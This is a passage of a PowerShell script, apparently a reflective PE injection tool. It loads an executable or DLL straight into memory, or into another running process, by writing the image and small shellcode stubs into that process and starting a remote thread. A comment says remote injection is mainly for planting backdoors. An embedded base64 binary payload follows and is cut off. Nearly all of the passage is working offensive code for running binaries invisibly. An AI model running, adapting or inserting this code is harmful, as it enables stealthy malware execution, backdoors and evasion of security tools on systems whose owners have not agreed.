		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	[Byte[]]$PEBytes = $null
	
	#if ($PsCmdlet.ParameterSetName -ieq "EmbedFile")
	#{
		<#
		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
		#>
		$InputString = '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